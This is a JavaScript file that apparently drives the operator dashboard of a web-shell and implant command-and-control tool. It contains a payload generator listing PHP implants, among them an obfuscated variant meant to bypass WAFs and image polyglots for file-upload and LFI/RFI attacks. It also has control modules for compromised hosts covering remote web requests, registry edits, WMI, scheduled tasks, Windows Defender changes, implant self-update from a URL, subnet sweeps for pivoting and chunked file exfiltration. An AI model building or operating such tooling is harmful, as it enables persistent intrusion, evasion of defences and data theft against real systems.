    $('webreqUrl').value = 'http://';
    $('webreqModal').style.display = 'flex';
}

function runWebReq() {
    const id = $('webreqId').value;
    const url = $('webreqUrl').value;
    const method = $('webreqMethod').value;
    const postData = $('webreqData').value;
    const headers = $('webreqHeaders').value;
    if (!url || url === 'http://') { showToast('Enter a URL', 'warning'); return; }
    const resultDiv = $('webreqResult');
    resultDiv.innerHTML = '<div class="loading">Requesting ' + esc(url) + '...</div>';
    implantFetch(id, { action: 'web_request', url: url, method: method, post_data: postData, headers: headers }, function(d) {
        if (d.status !== 'ok') { resultDiv.innerHTML = '<span class="error">' + esc(d.message || 'Failed') + '</span>'; return; }
        let body = '';
        try { body = atob(d.body || ''); } catch(e) { body = '(binary data, ' + (d.body || '').length + ' bytes)'; }
        let html = '<div class="module-toolbar"><span>HTTP ' + esc(d.http_code) + ' | ' + esc(d.content_type || '') + '</span></div>';
        html += '<pre class="file-viewer">' + esc(body.substring(0, 10000)) + '</pre>';
        resultDiv.innerHTML = html;
    });
}

// ========== PAYLOAD GENERATOR ==========

const payloadFilesByLang = {
    php: [
        { file: 'implant.php', name: 'Standard PHP', icon: 'P', desc: 'Full featured implant with exec, file mgmt, DB, scan, eval, self-destruct', color: 'cyan' },
        { file: 'implant_minimal.php', name: 'Minimal PHP', icon: 'M', desc: 'Lightweight (~1KB), core features only', color: 'green' },
        { file: 'implant_obfuscated.php', name: 'Obfuscated PHP', icon: 'O', desc: 'Base64-encoded strings to bypass WAF', color: 'purple' },
        { file: 'implant.jpg', name: 'JPEG Polyglot', icon: 'J', desc: 'Valid JPEG + PHP payload', color: 'red' },
        { file: 'implant.png', name: 'PNG Polyglot', icon: 'N', desc: 'Valid PNG + PHP payload', color: 'cyan' },
        { file: 'implant.gif', name: 'GIF Polyglot', icon: 'G', desc: 'Valid GIF + PHP payload', color: 'purple' },
        { file: 'implant.txt', name: 'Text (LFI)', icon: 'T', desc: 'Plain text PHP for LFI/RFI', color: 'red' },
    ],
    py: [
        { file: 'implant.py', name: 'Python Implant', icon: 'Py', desc: 'Python3 implant, no deps, exec+file+beacon', color: 'cyan' },
    ],
    sh: [
        { file: 'implant.sh', name: 'Bash Implant', icon: 'Sh', desc: 'Bash implant, exec+file+beacon+pw hunt', color: 'green' },
    ],
    pl: [
        { file: 'implant.pl', name: 'Perl Implant', icon: 'Pl', desc: 'Perl implant, exec+file+beacon', color: 'purple' },
    ],
    js: [
        { file: 'implant.js', name: 'Node.js Implant', icon: 'Js', desc: 'Node.js implant, exec+file+beacon, no npm', color: 'red' },
    ],
};

let currentPayloadLang = 'php';

function switchPayloadLang(lang, btn) {
    currentPayloadLang = lang;
    document.querySelectorAll('.payload-tab').forEach(t => t.classList.remove('active'));
    if (btn) btn.classList.add('active');
    renderPayloads();
}

function openPayloadGenerator() {
    $('payloadModal').style.display = 'flex';
    renderPayloads();
}

function renderPayloads() {
    const grid = $('payloadGrid');
    grid.innerHTML = '';
    const files = payloadFilesByLang[currentPayloadLang] || payloadFilesByLang.php;
    files.forEach(p => {
        const card = document.createElement('div');
        card.className = 'payload-card';
        card.innerHTML = `
            <div class="payload-icon ${p.color}">${p.icon}</div>
            <div class="payload-body">
                <div class="payload-name">${esc(p.name)}</div>
                <div class="payload-file">${esc(p.file)}</div>
                <div class="payload-desc">${esc(p.desc)}</div>
            </div>
            <div class="payload-actions">
                <button class="btn btn-sm" onclick="downloadPayload('${p.file}')">DL</button>
            </div>
        `;
        grid.appendChild(card);
    });
}

function downloadPayload(file) {
    $('dlFrame').src = 'payloads/' + encodeURIComponent(file) + '?t=' + Date.now();
    showToast('Downloading ' + file + '...', 'info', 2000);
}

function regeneratePayloads() {
    const key = $('payloadKey').value || 'sentinelx_2024';
    showToast('Regenerating payloads with key: ' + key + '...', 'info', 4000);
    fetch('tools/generator.php?type=all&key=' + encodeURIComponent(key) + '&dir=' + encodeURIComponent('payloads'))
        .then(r => r.text())
        .then(() => {
            showToast('Payloads regenerated with new auth key', 'success');
        })
        .catch(e => showToast('Regeneration failed: ' + e.message, 'danger'));
}

// ========== NEW MODULES ==========

// --- REGISTRY ---

function showRegistry(id) {
    $('registryId').value = id;
    $('regResult').innerHTML = '';
    $('registryModal').style.display = 'flex';
}

function runRegistry() {
    const id = $('registryId').value;
    const action = $('regAction').value;
    const key = $('regKey').value;
    const valueName = $('regValueName').value;
    const valueData = $('regValueData').value;
    const resultDiv = $('regResult');
    resultDiv.innerHTML = '<div class="loading">Running...</div>';
    api('registry', { id, reg_action: action, key, value_name: valueName, value_data: valueData }, function(d) {
        if (d.status !== 'ok') { resultDiv.innerHTML = '<span class="error">' + esc(d.message || 'Failed') + '</span>'; return; }
        resultDiv.innerHTML = '<pre class="file-viewer">' + esc(d.output || '(no output)') + '</pre>';
    });
}

// --- WMI ---

function showWmi(id) {
    $('wmiId').value = id;
    $('wmiResult').innerHTML = '';
    $('wmiModal').style.display = 'flex';
}

function runWmiQuery() {
    const id = $('wmiId').value;
    const query = $('wmiQuery').value;
    const resultDiv = $('wmiResult');
    resultDiv.innerHTML = '<div class="loading">Executing WMI...</div>';
    api('wmi_query', { id, wmi_query: query }, function(d) {
        if (d.status !== 'ok') { resultDiv.innerHTML = '<span class="error">' + esc(d.message || 'Failed') + '</span>'; return; }
        resultDiv.innerHTML = '<pre class="file-viewer">' + esc(d.output || '(no output)') + '</pre>';
    });
}

// --- SCHTASKS ---

function showSchtasks(id) {
    $('schtasksId').value = id;
    $('schResult').innerHTML = '';
    $('schtasksModal').style.display = 'flex';
}

function runSchtasks() {
    const id = $('schtasksId').value;
    const action = $('schAction').value;
    const name = $('schName').value;
    const command = $('schCommand').value;
    const time = $('schTime').value;
    const resultDiv = $('schResult');
    resultDiv.innerHTML = '<div class="loading">Running...</div>';
    api('schtasks', { id, sch_action: action, sch_name: name, sch_command: command, sch_time: time }, function(d) {
        if (d.status !== 'ok') { resultDiv.innerHTML = '<span class="error">' + esc(d.message || 'Failed') + '</span>'; return; }
        resultDiv.innerHTML = '<pre class="file-viewer">' + esc(d.output || '(no output)') + '</pre>';
    });
}

// --- WINDOWS DEFENDER ---

function showDefender(id) {
    $('defenderId').value = id;
    $('defResult').innerHTML = '';
    $('defenderModal').style.display = 'flex';
}

function runDefender(action) {
    const id = $('defenderId').value;
    const path = $('defPath').value;
    const resultDiv = $('defResult');
    resultDiv.innerHTML = '<div class="loading">Running...</div>';
    api('windows_defender', { id, def_action: action, def_path: path }, function(d) {
        if (d.status !== 'ok') { resultDiv.innerHTML = '<span class="error">' + esc(d.message || 'Failed') + '</span>'; return; }
        resultDiv.innerHTML = '<pre class="file-viewer">' + esc(d.output || '(no output)') + '</pre>';
    });
}

// --- DB SCHEMA ---

function showDbSchema(id) {
    $('dbSchemaId').value = id;
    $('dbSchemaResult').innerHTML = '';
    $('dbSchemaModal').style.display = 'flex';
}

function runDbSchema(e) {
    e.preventDefault();
    const id = $('dbSchemaId').value;
    const dbType = $('dbSchemaType').value;
    const host = $('dbSchemaHost').value;
    const user = $('dbSchemaUser').value;
    const pass = $('dbSchemaPass').value;
    const name = $('dbSchemaName').value;
    const resultDiv = $('dbSchemaResult');
    resultDiv.innerHTML = '<div class="loading">Browsing schema...</div>';
    api('db_schema', { id, db_type: dbType, db_host: host, db_user: user, db_pass: pass, db_name: name }, function(d) {
        if (d.status !== 'ok') { resultDiv.innerHTML = '<span class="error">' + esc(d.message || 'Failed') + '</span>'; return; }
        let html = '<div class="module-toolbar"><span>Database: ' + esc(d.database) + ' | Tables: ' + (d.tables || []).length + '</span></div>';
        (d.schema || []).forEach(tbl => {
            html += '<div class="section-title" style="margin-top:10px;">' + esc(tbl.table) + '</div>';
            html += '<table class="module-table"><thead><tr>';
            if (tbl.columns && tbl.columns.length) {
                Object.keys(tbl.columns[0]).forEach(k => html += '<th>' + esc(k) + '</th>');
                html += '</tr></thead><tbody>';
                tbl.columns.forEach(c => {
                    html += '<tr>';
                    Object.values(c).forEach(v => html += '<td class="mono">' + esc(String(v ?? '')) + '</td>');
                    html += '</tr>';
                });
            }
            html += '</tbody></table>';
        });
        resultDiv.innerHTML = html;
    });
}

// --- AUTO UPDATE ---

function showAutoUpdate(id) {
    $('updateId').value = id;
    $('updateResult').innerHTML = '';
    $('updateUrl').value = '';
    $('updateModal').style.display = 'flex';
}

function runAutoUpdate() {
    const id = $('updateId').value;
    const url = $('updateUrl').value;
    if (!url) { showToast('Enter a URL', 'warning'); return; }
    const resultDiv = $('updateResult');
    resultDiv.innerHTML = '<div class="loading">Updating implant...</div>';
    api('auto_update', { id, url: url }, function(d) {
        if (d.status !== 'ok') { resultDiv.innerHTML = '<span class="error">' + esc(d.message || 'Failed') + '</span>'; return; }
        resultDiv.innerHTML = '<div class="text-success">' + esc(d.message) + '</div>';
        showToast('Implant updated successfully', 'success');
    });
}

// --- AT SCHEDULE ---

function showAtSchedule(id) {
    $('atId').value = id;
    $('atResult').innerHTML = '';
    $('atModal').style.display = 'flex';
}

function runAtSchedule() {
    const id = $('atId').value;
    const cmd = $('atCmd').value;
    const time = $('atTime').value;
    if (!cmd) { showToast('Enter a command', 'warning'); return; }
    const resultDiv = $('atResult');
    resultDiv.innerHTML = '<div class="loading">Scheduling...</div>';
    api('at_schedule', { id, cmd, time }, function(d) {
        if (d.status !== 'ok') { resultDiv.innerHTML = '<span class="error">' + esc(d.message || 'Failed') + '</span>'; return; }
        resultDiv.innerHTML = '<pre class="file-viewer">' + esc(d.output || '(no output)') + '</pre>';
    });
}

// --- PIVOT SWEEP ---

function showSweep(id) {
    $('sweepId').value = id;
    $('sweepResult').innerHTML = '';
    $('sweepModal').style.display = 'flex';
}

function runSweep() {
    const id = $('sweepId').value;
    const subnet = $('sweepSubnet').value;
    const timeout = $('sweepTimeout').value || '1';
    const resultDiv = $('sweepResult');
    resultDiv.innerHTML = '<div class="loading">Sweeping ' + esc(subnet) + '.0/24...</div>';
    api('pivot_sweep', { id, subnet, timeout }, function(d) {
        if (d.status !== 'ok') { resultDiv.innerHTML = '<span class="error">' + esc(d.message || 'Failed') + '</span>'; return; }
        const alive = d.alive || [];
        let html = '<div class="module-toolbar"><span class="text-success">' + d.count + ' hosts alive</span></div>';
        if (alive.length) {
            html += '<div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:8px;">';
            alive.forEach(h => {
                html += '<a href="#" class="btn btn-sm" style="text-decoration:none;" onclick="alert(\'' + esc(h) + '\')">' + esc(h) + '</a>';
            });
            html += '</div>';
        }
        resultDiv.innerHTML = html || '<div class="loading">No hosts found</div>';
    });
}

// --- CHUNKED DOWNLOAD ---

function showChunkedDownload(id) {
    $('chunkId').value = id;
    $('chunkPath').value = '';
    $('chunkData').style.display = 'none';
    $('chunkProgress').style.display = 'none';
    $('chunkResult').innerHTML = '';
    $('chunkModal').style.display = 'flex';
}

function startChunkedDownload() {
    const id = $('chunkId').value;
    const path = $('chunkPath').value;
    const chunkSize = (parseInt($('chunkSize').value) || 1024) * 1024;
    if (!path) { showToast('Enter a remote file path', 'warning'); return; }
    $('chunkData').style.display = 'none';
    $('chunkProgress').style.display = 'flex';
    $('chunkResult').innerHTML = '';
    let allData = [];
    let offset = 0;
    let totalSize = 0;
    let downloading = true;

    function fetchChunk() {
        if (!downloading) return;
        api('chunked_download', { id, path, offset: String(offset), chunk_size: String(chunkSize) }, function(d) {
            if (d.status !== 'ok') {
                $('chunkResult').innerHTML = '<span class="error">' + esc(d.message || 'Failed') + '</span>';
                $('chunkProgress').style.display = 'none';
                return;
            }
            if (!totalSize) totalSize = d.total;
            allData.push(d.data);
            offset += d.size;
            const pct = totalSize > 0 ? Math.min(100, Math.round(offset / totalSize * 100)) : 0;
            $('chunkStatus').textContent = offset + ' / ' + totalSize + ' bytes';
            $('chunkBar').value = pct;
            $('chunkPercent').textContent = pct + '%';
            if (d.size === 0 || offset >= totalSize) {
                downloading = false;
                $('chunkProgress').style.display = 'none';
                $('chunkResult').innerHTML = '';
                try {
                    const fullData = allData.join('');
                    const binary = atob(fullData);
                    // Show preview
                    $('chunkData').style.display = 'block';
                    $('chunkData').textContent = '(Downloaded ' + totalSize + ' bytes successfully)\n\n' + binary.substring(0, 2000) + '...';
                    // Also offer as download
                    const blob = new Blob([binary], { type: 'application/octet-stream' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = basename(path);
                    a.click();
                    URL.revokeObjectURL(url);
                    showToast('Downloaded ' + totalSize + ' bytes', 'success');
                } catch(e) {
                    $('chunkResult').innerHTML = '<span class="error">Decode error: ' + esc(e.message) + '</span>';
                }
            } else {
                setTimeout(fetchChunk, 100);
            }
        });
    }
    fetchChunk();
}

// ========== VERSION / UPDATE CHECK ==========

function checkUpdate() {
    api('check_update', {}, function(d) {
        if (d.status !== 'ok') return;
        const badge = $('versionBadge');
        if (badge) badge.textContent = 'v' + d.current;
        if (!d.uptodate && d.latest) {
            const notif = $('updateNotif');
            if (notif) {
                notif.style.display = 'inline-flex';
                notif.className = 'update-badge has-update';
                notif.title = 'Update v' + d.latest + ' available!';
            }
        }
    });
}

function showUpdateModal() {
    api('check_update', {}, function(d) {
        if (d.status !== 'ok') { $('updateInfo').innerHTML = '<div class="loading">Check failed</div>'; return; }
        const uptodate = d.uptodate || d.current === d.latest;
        let html = '<div class="module-toolbar"><span>Current: v' + d.current + '</span><span style="margin-left:12px;">Latest: v' + d.latest + '</span></div>';
        if (uptodate) {
            html += '<div class="text-success" style="padding:12px;font-weight:600;">You are running the latest version.</div>';
        } else {
            html += '<div class="text-danger" style="padding:12px;font-weight:600;">Update v' + d.latest + ' is available!</div>';
            if (d.notes) html += '<div style="padding:0 12px 12px;font-size:12px;color:var(--text-dim);">' + esc(d.notes) + '</div>';
            if (d.url) html += '<div style="padding:0 12px 12px;"><a href="' + esc(d.url) + '" target="_blank" class="btn btn-primary">Download Update</a></div>';
        }
        $('updateInfo').innerHTML = html;
    });
    $('updateModal').style.display = 'flex';
}

// ========== INIT ==========

window.onclick = function(e) {
    if (e.target.classList.contains('modal')) e.target.style.display = 'none';
};

document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
    }
});

(function init() {
    initTheme();
    refreshList();
    checkUpdate();
    // Check for updates every 30 min
    setInterval(checkUpdate, 1800000);
})();
